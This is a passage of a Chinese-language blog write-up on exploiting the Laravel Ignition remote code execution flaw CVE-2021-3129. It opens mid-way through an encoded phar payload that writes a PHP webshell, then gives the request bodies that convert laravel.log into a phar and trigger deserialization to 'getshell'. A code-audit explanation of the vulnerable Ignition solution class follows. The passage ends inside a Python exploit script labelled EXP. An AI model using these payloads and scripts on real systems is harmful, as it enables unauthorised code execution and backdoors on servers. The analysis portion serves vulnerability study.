string">"=50=00=44=00=39=00=77=00=61=00=48=00=41=00=67=00=58=00=31=00=39=00=49=00=51=00=55=00=78=00=55=00=58=00=30=00=4E=00=50=00=54=00=56=00=42=00=4A=00=54=00=45=00=56=00=53=00=4B=00=43=00=6B=00=37=00=49=00=44=00=38=00=2B=00=44=00=51=00=70=00=4E=00=41=00=67=00=41=00=41=00=41=00=51=00=41=00=41=00=41=00=42=00=45=00=41=00=41=00=41=00=41=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=58=00=41=00=67=00=41=00=41=00=54=00=7A=00=6F=00=30=00=4D=00=44=00=6F=00=69=00=53=00=57=00=78=00=73=00=64=00=57=00=31=00=70=00=62=00=6D=00=46=00=30=00=5A=00=56=00=78=00=43=00=63=00=6D=00=39=00=68=00=5A=00=47=00=4E=00=68=00=63=00=33=00=52=00=70=00=62=00=6D=00=64=00=63=00=55=00=47=00=56=00=75=00=5A=00=47=00=6C=00=75=00=5A=00=30=00=4A=00=79=00=62=00=32=00=46=00=6B=00=59=00=32=00=46=00=7A=00=64=00=43=00=49=00=36=00=4D=00=6A=00=70=00=37=00=63=00=7A=00=6F=00=35=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=6C=00=64=00=6D=00=56=00=75=00=64=00=48=00=4D=00=69=00=4F=00=30=00=38=00=36=00=4D=00=6A=00=55=00=36=00=49=00=6B=00=6C=00=73=00=62=00=48=00=56=00=74=00=61=00=57=00=35=00=68=00=64=00=47=00=56=00=63=00=51=00=6E=00=56=00=7A=00=58=00=45=00=52=00=70=00=63=00=33=00=42=00=68=00=64=00=47=00=4E=00=6F=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=45=00=36=00=65=00=33=00=4D=00=36=00=4D=00=54=00=59=00=36=00=49=00=67=00=41=00=71=00=41=00=48=00=46=00=31=00=5A=00=58=00=56=00=6C=00=55=00=6D=00=56=00=7A=00=62=00=32=00=78=00=32=00=5A=00=58=00=49=00=69=00=4F=00=32=00=45=00=36=00=4D=00=6A=00=70=00=37=00=61=00=54=00=6F=00=77=00=4F=00=30=00=38=00=36=00=4D=00=6A=00=55=00=36=00=49=00=6B=00=31=00=76=00=59=00=32=00=74=00=6C=00=63=00=6E=00=6C=00=63=00=54=00=47=00=39=00=68=00=5A=00=47=00=56=00=79=00=58=00=45=00=56=00=32=00=59=00=57=00=78=00=4D=00=62=00=32=00=46=00=6B=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=41=00=36=00=65=00=33=00=31=00=70=00=4F=00=6A=00=45=00=37=00=63=00=7A=00=6F=00=30=00=4F=00=69=00=4A=00=73=00=62=00=32=00=46=00=6B=00=49=00=6A=00=74=00=39=00=66=00=58=00=4D=00=36=00=4F=00=44=00=6F=00=69=00=41=00=43=00=6F=00=41=00=5A=00=58=00=5A=00=6C=00=62=00=6E=00=51=00=69=00=4F=00=30=00=38=00=36=00=4D=00=7A=00=67=00=36=00=49=00=6B=00=6C=00=73=00=62=00=48=00=56=00=74=00=61=00=57=00=35=00=68=00=64=00=47=00=56=00=63=00=51=00=6E=00=4A=00=76=00=59=00=57=00=52=00=6A=00=59=00=58=00=4E=00=30=00=61=00=57=00=35=00=6E=00=58=00=45=00=4A=00=79=00=62=00=32=00=46=00=6B=00=59=00=32=00=46=00=7A=00=64=00=45=00=56=00=32=00=5A=00=57=00=35=00=30=00=49=00=6A=00=6F=00=78=00=4F=00=6E=00=74=00=7A=00=4F=00=6A=00=45=00=77=00=4F=00=69=00=4A=00=6A=00=62=00=32=00=35=00=75=00=5A=00=57=00=4E=00=30=00=61=00=57=00=39=00=75=00=49=00=6A=00=74=00=50=00=4F=00=6A=00=4D=00=79=00=4F=00=69=00=4A=00=4E=00=62=00=32=00=4E=00=72=00=5A=00=58=00=4A=00=35=00=58=00=45=00=64=00=6C=00=62=00=6D=00=56=00=79=00=59=00=58=00=52=00=76=00=63=00=6C=00=78=00=4E=00=62=00=32=00=4E=00=72=00=52=00=47=00=56=00=6D=00=61=00=57=00=35=00=70=00=64=00=47=00=6C=00=76=00=62=00=69=00=49=00=36=00=4D=00=6A=00=70=00=37=00=63=00=7A=00=6F=00=35=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=6A=00=62=00=32=00=35=00=6D=00=61=00=57=00=63=00=69=00=4F=00=30=00=38=00=36=00=4D=00=7A=00=55=00=36=00=49=00=6B=00=31=00=76=00=59=00=32=00=74=00=6C=00=63=00=6E=00=6C=00=63=00=52=00=32=00=56=00=75=00=5A=00=58=00=4A=00=68=00=64=00=47=00=39=00=79=00=58=00=45=00=31=00=76=00=59=00=32=00=74=00=44=00=62=00=32=00=35=00=6D=00=61=00=57=00=64=00=31=00=63=00=6D=00=46=00=30=00=61=00=57=00=39=00=75=00=49=00=6A=00=6F=00=78=00=4F=00=6E=00=74=00=7A=00=4F=00=6A=00=63=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=35=00=68=00=62=00=57=00=55=00=69=00=4F=00=33=00=4D=00=36=00=4E=00=7A=00=6F=00=69=00=59=00=57=00=4A=00=6A=00=5A=00=47=00=56=00=6D=00=5A=00=79=00=49=00=37=00=66=00=58=00=4D=00=36=00=4E=00=7A=00=6F=00=69=00=41=00=43=00=6F=00=41=00=59=00=32=00=39=00=6B=00=5A=00=53=00=49=00=37=00=63=00=7A=00=6F=00=78=00=4D=00=44=00=4D=00=36=00=49=00=6A=00=77=00=2F=00=63=00=47=00=68=00=77=00=49=00=48=00=4E=00=35=00=63=00=33=00=52=00=6C=00=62=00=53=00=67=00=6E=00=5A=00=57=00=4E=00=6F=00=62=00=79=00=42=00=51=00=52=00=44=00=6C=00=33=00=59=00=55=00=68=00=42=00=5A=00=30=00=6C=00=48=00=56=00=6A=00=4A=00=5A=00=56=00=33=00=64=00=76=00=53=00=6B=00=59=00=35=00=55=00=56=00=51=00=78=00=54=00=6C=00=56=00=58=00=4D=00=6B=00=5A=00=6B=00=53=00=31=00=52=00=7A=00=4C=00=31=00=42=00=6E=00=50=00=54=00=31=00=38=00=59=00=6D=00=46=00=7A=00=5A=00=54=00=59=00=30=00=49=00=43=00=31=00=6B=00=49=00=44=00=34=00=67=00=4C=00=33=00=5A=00=68=00=63=00=69=00=39=00=33=00=64=00=33=00=63=00=76=00=61=00=48=00=52=00=74=00=62=00=43=00=39=00=7A=00=61=00=47=00=56=00=73=00=62=00=43=00=35=00=77=00=61=00=48=00=41=00=6E=00=4B=00=54=00=73=00=67=00=5A=00=58=00=68=00=70=00=64=00=44=00=73=00=67=00=50=00=7A=00=34=00=69=00=4F=00=33=00=31=00=39=00=66=00=51=00=67=00=41=00=41=00=41=00=42=00=30=00=5A=00=58=00=4E=00=30=00=4C=00=6E=00=52=00=34=00=64=00=41=00=51=00=41=00=41=00=41=00=44=00=47=00=4B=00=44=00=68=00=6B=00=42=00=41=00=41=00=41=00=41=00=41=00=78=00=2B=00=66=00=39=00=69=00=6B=00=41=00=51=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=48=00=52=00=6C=00=63=00=33=00=51=00=62=00=64=00=32=00=6A=00=61=00=74=00=58=00=77=00=4A=00=4D=00=56=00=57=00=73=00=52=00=6A=00=50=00=58=00=4A=00=5A=00=52=00=48=00=50=00=37=00=4B=00=76=00=5A=00=51=00=49=00=41=00=41=00=41=00=42=00=48=00=51=00=6B=00=31=00=43=00a"</span> <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2024/12/31/lou-dong-zhi-shi-ku/laravel-rce-cve-2021-3129/%E6%88%AA%E5%B1%8F2025-01-02%2014.06.38.png" style="zoom:50%;"><h3 id="2-2-6-step5-将日志文件构造成phar"><a href="#2-2-6-step5-将日志文件构造成phar" class="headerlink" title="2.2.6 step5:将日志文件构造成phar"></a>2.2.6 step5:将日志文件构造成phar</h3><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span> <span class="token property">"solution"</span><span class="token operator">:</span> <span class="token string">"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution"</span><span class="token punctuation">,</span> <span class="token property">"parameters"</span><span class="token operator">:</span> <span class="token punctuation">{</span> <span class="token property">"variableName"</span><span class="token operator">:</span> <span class="token string">"xxxxx"</span><span class="token punctuation">,</span> <span class="token property">"viewFile"</span><span class="token operator">:</span> <span class="token string">"php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log"</span> <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2024/12/31/lou-dong-zhi-shi-ku/laravel-rce-cve-2021-3129/%E6%88%AA%E5%B1%8F2025-01-02%2014.09.28.png" style="zoom:50%;"><h3 id="2-2-7-step6-触发发序列化"><a href="#2-2-7-step6-触发发序列化" class="headerlink" title="2.2.7 step6:触发发序列化"></a>2.2.7 step6:触发发序列化</h3><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span> <span class="token property">"solution"</span><span class="token operator">:</span> <span class="token string">"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution"</span><span class="token punctuation">,</span> <span class="token property">"parameters"</span><span class="token operator">:</span> <span class="token punctuation">{</span> <span class="token property">"variableName"</span><span class="token operator">:</span> <span class="token string">"xxxxx"</span><span class="token punctuation">,</span> <span class="token property">"viewFile"</span><span class="token operator">:</span> <span class="token string">"phar://../storage/logs/laravel.log/test.txt"</span> <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2024/12/31/lou-dong-zhi-shi-ku/laravel-rce-cve-2021-3129/%E6%88%AA%E5%B1%8F2025-01-02%2014.11.33.png" style="zoom:50%;"><img src="/2024/12/31/lou-dong-zhi-shi-ku/laravel-rce-cve-2021-3129/%E6%88%AA%E5%B1%8F2025-01-02%2014.12.28.png" style="zoom:40%;"><p>成功写入木马。</p><h3 id="2-2-8-step7-getshell"><a href="#2-2-8-step7-getshell" class="headerlink" title="2.2.8 step7:getshell"></a>2.2.8 step7:getshell</h3><p>后门的地址和密码如下：</p><img src="/2024/12/31/lou-dong-zhi-shi-ku/laravel-rce-cve-2021-3129/%E6%88%AA%E5%B1%8F2025-01-02%2014.14.51.png" style="zoom:50%;"><img src="/2024/12/31/lou-dong-zhi-shi-ku/laravel-rce-cve-2021-3129/%E6%88%AA%E5%B1%8F2025-01-02%2014.14.15.png" style="zoom:50%;"><p>至此，成功通过RCE getshell！</p><h1 id="三、代码审计-漏洞分析"><a href="#三、代码审计-漏洞分析" class="headerlink" title="三、代码审计-漏洞分析"></a>三、代码审计-漏洞分析</h1><h2 id="3-1-ignition组件的solutions"><a href="#3-1-ignition组件的solutions" class="headerlink" title="3.1 ignition组件的solutions"></a>3.1 ignition组件的solutions</h2><p>Laravel在第6版之后，debug模式使用了ignition组件来美化堆栈信息。ignition作为Laravel的调试工具，它不仅美化了错误堆栈信息，还提供了一些解决方案（solutions），允许开发者通过点击按钮快速修复一些错误。</p><p>在<code>vendor\facade\ignition\src\Solutions</code>目录下，Ignition组件提供的解决方案（solutions）包括（部分）：</p><ol><li><code>GenerateAppKeySolution.php</code>：用于生成应用程序的加密密钥。</li><li><code>RunMigrationsSolution.php</code>：用于运行数据库迁移。</li><li><code>SuggestUsingCorrectDbNameSolution.php</code>：建议使用正确的数据库名称。</li><li><code>LivewireDiscoverSolution.php</code>：与Livewire框架相关的解决方案。</li><li><code>SolutionTransformer.php</code>：用于转换解决方案的类。</li><li><code>UseDefaultValetDbCredentialsSolution.php</code>：使用默认的Valet数据库凭证。</li><li><code>MakeViewVariableOptionalSolution.php</code>：使视图变量可选的解决方案。</li></ol><img src="/2024/12/31/lou-dong-zhi-shi-ku/laravel-rce-cve-2021-3129/%E6%88%AA%E5%B1%8F2025-01-02%2011.27.00.png" style="zoom:40%;"><h2 id="3-2-漏洞成因"><a href="#3-2-漏洞成因" class="headerlink" title="3.2 漏洞成因"></a>3.2 漏洞成因</h2><h3 id="3-2-1-Laravel如何调用solution"><a href="#3-2-1-Laravel如何调用solution" class="headerlink" title="3.2.1 Laravel如何调用solution"></a>3.2.1 Laravel如何调用solution</h3><p>solution的控制器中（vendor\facade\ignition\src\Http\Controllers\ExecuteSolutionController.php）,在ExecuteSolutionController中会去调用对应solution的run方法并传入参数parameters，而这个参数是抓包时请求正文中的parameters，所以这个输入参数是我们可以控制的。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">Facade<span class="token punctuation">\</span>Ignition<span class="token punctuation">\</span>Http<span class="token punctuation">\</span>Controllers</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">Facade<span class="token punctuation">\</span>Ignition<span class="token punctuation">\</span>Http<span class="token punctuation">\</span>Requests<span class="token punctuation">\</span>ExecuteSolutionRequest</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">Facade<span class="token punctuation">\</span>IgnitionContracts<span class="token punctuation">\</span>SolutionProviderRepository</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Foundation<span class="token punctuation">\</span>Validation<span class="token punctuation">\</span>ValidatesRequests</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ExecuteSolutionController</span><span class="token punctuation">{</span>    <span class="token keyword">use</span> <span class="token package">ValidatesRequests</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span>        <span class="token class-name type-declaration">ExecuteSolutionRequest</span> <span class="token variable">$request</span><span class="token punctuation">,</span>        <span class="token class-name type-declaration">SolutionProviderRepository</span> <span class="token variable">$solutionProviderRepository</span>    <span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$solution</span> <span class="token operator">=</span> <span class="token variable">$request</span><span class="token operator">-&gt;</span><span class="token function">getRunnableSolution</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$solution</span><span class="token operator">-&gt;</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token operator">-&gt;</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'parameters'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 调用对应solution对象的run()方法，并传入参数parameters</span>        <span class="token keyword">return</span> <span class="token function">response</span><span class="token punctuation">(</span><span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-2-2-MakeViewVariableOptionalSolution-php的run-方法"><a href="#3-2-2-MakeViewVariableOptionalSolution-php的run-方法" class="headerlink" title="3.2.2 MakeViewVariableOptionalSolution.php的run()方法"></a>3.2.2 MakeViewVariableOptionalSolution.php的run()方法</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">Facade<span class="token punctuation">\</span>Ignition<span class="token punctuation">\</span>Solutions</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">Facade<span class="token punctuation">\</span>IgnitionContracts<span class="token punctuation">\</span>RunnableSolution</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Support<span class="token punctuation">\</span>Facades<span class="token punctuation">\</span>Blade</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">MakeViewVariableOptionalSolution</span> <span class="token keyword">implements</span> <span class="token class-name">RunnableSolution</span><span class="token punctuation">{</span>    <span class="token operator">...</span><span class="token operator">...</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">run</span><span class="token punctuation">(</span><span class="token keyword type-hint">array</span> <span class="token variable">$parameters</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$output</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">makeOptional</span><span class="token punctuation">(</span><span class="token variable">$parameters</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$output</span> <span class="token operator">!==</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment">// 将makeOptional()方法的结果输出对应文件中（viewFile参数指定）</span>            <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$parameters</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'viewFile'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$output</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">makeOptional</span><span class="token punctuation">(</span><span class="token keyword type-hint">array</span> <span class="token variable">$parameters</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token comment">// 调用file_get_contents方法将传入的参数作为路径读取文件内容，用$originalContents存储，作为原始内容</span>        <span class="token variable">$originalContents</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$parameters</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'viewFile'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 处理读取的内容，若文件内容中存在‘$variableNamed的值’，则替换为‘$variableNamed的值??’，将处理后的内容使用$newContents存储，作为新的内容</span>        <span class="token variable">$newContents</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'$'</span><span class="token operator">.</span><span class="token variable">$parameters</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'variableName'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'$'</span><span class="token operator">.</span><span class="token variable">$parameters</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'variableName'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">" ?? ''"</span><span class="token punctuation">,</span> <span class="token variable">$originalContents</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 以下代码为处理原始内容与新内容</span>        <span class="token variable">$originalTokens</span> <span class="token operator">=</span> <span class="token function">token_get_all</span><span class="token punctuation">(</span><span class="token class-name static-context">Blade</span><span class="token operator">::</span><span class="token function">compileString</span><span class="token punctuation">(</span><span class="token variable">$originalContents</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$newTokens</span> <span class="token operator">=</span> <span class="token function">token_get_all</span><span class="token punctuation">(</span><span class="token class-name static-context">Blade</span><span class="token operator">::</span><span class="token function">compileString</span><span class="token punctuation">(</span><span class="token variable">$newContents</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$expectedTokens</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">generateExpectedTokens</span><span class="token punctuation">(</span><span class="token variable">$originalTokens</span><span class="token punctuation">,</span> <span class="token variable">$parameters</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'variableName'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 只要原始内容中不含‘$variableNamed的值’，$originalContents与$newContents的值会相同，那么下方的判断条件不会成立，就不会返回false</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$expectedTokens</span> <span class="token operator">!==</span> <span class="token variable">$newTokens</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token variable">$newContents</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在<code>run</code>方法中，<code>makeOptional()</code>函数被用来处理输入的参数。这个方法首先会执行<code>file_get_contents()</code>函数。因为我们能够控制<code>$parameters['viewFile']</code>这个变量，如果能够进一步将恶意的phar文件上传或写入到服务器上，那么就可以利用<code>file_get_contents()</code>函数触发phar文件的反序列化，进而实现攻击。</p><p>我们还可以从makeOptional()方法剩下的代码中发现，当file_get_contents()获取到的文件内容中不含‘$variableNamed的值’时，则一定会返回读取的文件内容。而接着在run()方法中会调用file_put_contents()方法将makeOptional()方法返回的结果（读取的文件内容）又重新输出到原文件中。</p><ol><li><strong>漏洞成因</strong>：漏洞主要成因是Ignition组件中<code>MakeViewVariableOptionalSolution</code>类的参数过滤不严谨。在<code>MakeViewVariableOptionalSolution</code>的<code>run</code>方法中，使用了<code>file_get_contents()</code>和<code>file_put_contents()</code>函数，这些函数可以读取和写入文件，但是没有对用户输入进行充分的验证和清理，导致攻击者可以通过控制这些输入来执行恶意操作。</li><li><strong>漏洞触发</strong>：攻击者可以通过发送特定的POST请求到<code>/_ignition/execute-solution</code>路由，利用<code>MakeViewVariableOptionalSolution</code>解决方案，通过控制<code>parameters</code>参数来触发漏洞。</li></ol><h2 id="3-3-漏洞利用思路"><a href="#3-3-漏洞利用思路" class="headerlink" title="3.3 漏洞利用思路"></a>3.3 漏洞利用思路</h2><p>Laravel远程代码执行漏洞（CVE-2021-3129）利用日志文件进行攻击的原理可以概括如下：</p><ol><li><strong>Debug模式开启</strong>：当Laravel框架开启Debug模式时，Ignition组件会提供详细的错误信息和解决方案。</li><li><strong>Ignition组件的不安全使用</strong>：Ignition组件中的<code>MakeViewVariableOptionalSolution</code>类在处理传入的参数时，会调用<code>file_get_contents()</code>方法读取一个由外部参数指定的文件内容，这个文件路径是可控的。</li><li><strong>日志文件的利用</strong>：攻击者无法直接上传phar文件时，可以利用Laravel的日志文件<code>laravel.log</code>来进行攻击。这个日志文件记录了Laravel的报错信息，攻击者可以通过构造恶意请求，使得错误信息中包含攻击者控制的内容，从而将<code>laravel.log</code>文件变为一个合法的phar文件进行利用。</li><li><strong>日志文件格式</strong>：<code>laravel.log</code>文件中的错误信息格式允许攻击者通过控制<code>viewFile</code>的值，配合<code>makeOptional()</code>方法中的<code>file_get_contents()</code>和<code>file_put_contents()</code>方法，将日志文件改造成一个phar文件。</li><li><strong>Phar文件的头部</strong>：一个文件是否是phar文件的标准是其是否携带了phar文件的头部。攻击者通过控制日志文件中输出的内容，可以完成RCE漏洞利用。</li><li><strong>清空日志文件</strong>：攻击者首先需要清空日志文件，以便写入恶意的phar文件内容。</li><li><strong>写入恶意内容</strong>：攻击者通过发送特定的POST请求，将恶意的phar文件内容写入<code>laravel.log</code>文件中，利用编码转换（如<code>convert.quoted-printable-decode</code>、<code>convert.iconv.utf-16le.utf-8</code>、<code>convert.base64-decode</code>）清除内容。</li><li><strong>触发Phar反序列化</strong>：最后，攻击者通过<code>phar://</code>协议触发phar文件的反序列化，执行任意代码，完成远程代码执行攻击。</li></ol><p>总结来说，CVE-2021-3129漏洞利用了Ignition组件对文件操作的不安全使用，结合Laravel日志文件的特性，通过构造特定的请求和响应，将日志文件转换为恶意的phar文件，最终实现远程代码执行。</p><h1 id="四、EXP"><a href="#四、EXP" class="headerlink" title="四、EXP"></a>四、EXP</h1><h2 id="4-1-exp1-写入复杂木马"><a href="#4-1-exp1-写入复杂木马" class="headerlink" title="4.1 exp1-写入复杂木马"></a>4.1 exp1-写入复杂木马</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*- </span><span class="token keyword">import</span> requests<span class="token punctuation">,</span>json<span class="token keyword">import</span> sys<span class="token punctuation">,</span>reproxies <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token string">"http"</span><span class="token punctuation">:</span> <span class="token string">'127.0.0.1:8080'</span><span class="token punctuation">}</span> header<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"User-Agent"</span><span class="token punctuation">:</span><span class="token string">"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0"</span><span class="token punctuation">,</span><span class="token string">"Content-Type"</span><span class="token punctuation">:</span><span class="token string">"application/json"</span><span class="token punctuation">}</span>  <span class="token keyword">def</span> <span class="token function">clearlog</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token string">"solution"</span><span class="token punctuation">:</span> <span class="token string">"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution"</span><span class="token punctuation">,</span> <span class="token string">"parameters"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>  <span class="token string">"variableName"</span><span class="token punctuation">:</span><span class="token string">"username"</span><span class="token punctuation">,</span><span class="token string">"viewFile"</span><span class="token punctuation">:</span> <span class="token string">"php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log"</span> <span class="token punctuation">}</span><span class="token punctuation">}</span>     req<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>header<span class="token punctuation">,</span>data<span class="token operator">=</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">,</span>indent<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> req <span class="token keyword">def</span> <span class="token function">AA</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    data<span class="token operator">=</span><span class="token punctuation">{</span> <span class="token string">"solution"</span><span class="token punctuation">:</span> <span class="token string">"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution"</span><span class="token punctuation">,</span> <span class="token string">"parameters"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>  <span class="token string">"variableName"</span><span class="token punctuation">:</span><span class="token string">"username"</span><span class="token punctuation">,</span><span class="token string">"viewFile"</span><span class="token punctuation">:</span> <span class="token string">"AA"</span> <span class="token punctuation">}</span><span class="token punctuation">}</span>    req<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>header<span class="token punctuation">,</span>data<span class="token operator">=</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">,</span>indent<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> req <span class="token keyword">def</span> <span class="token function">sendpayloadwindows</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    data<span class="token operator">=</span><span class="token punctuation">{</span> <span class="token string">"solution"</span><span class="token punctuation">:</span> <span class="token string">"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution"</span><span class="token punctuation">,</span> <span class="token string">"parameters"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>  <span class="token string">"variableName"</span><span class="token punctuation">:</span><span class="token string">"username"</span><span class="token punctuation">,</span><span class="token string">"viewFile"</span><span class="token punctuation">:</span> <span class="token 